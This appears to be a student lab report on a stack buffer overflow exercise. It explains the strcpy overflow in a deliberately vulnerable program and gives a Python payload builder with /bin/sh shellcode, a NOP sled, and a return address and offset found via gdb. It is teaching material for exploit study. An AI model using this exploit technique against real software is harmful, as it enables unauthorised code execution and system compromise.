## TASK 1: Getting Familiar with Shellcode

We realised we had to inject the shellcode somewhere in the program and force it to run.  Both the 32 and 64.bit versions of the program open a shell when run. The execstack flag in the makefile makes this possible as it allows code to be executed from the stack, where the injected shellcode is located in an array.

## TASK 2: Understanding the Vulnerable Program

We found a vulnerability in the program in the _strcpy_ function because the buffer string array have different sizes which means we could write to unallocated memory changing the return pointer to an arbitrary value. Changing this value to the location of shellcode we injected in the string would make the shell run. 

## TASK 3: Launching Attack on 32-bit Program

We discovered the memory position of the base pointer and buffer start through gdb and calculated the return pointer memory address, this let us know the appropriate offset for writing the new address relative to the start of the buffer so the return pointer would be changed. We changed this value to the memory position of the start of the buffer where we had stored the provided shellcode.

We formatted the string with this script:
``` py
# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0              # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffc9dc     # Change this number 
offset = 112              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################
```

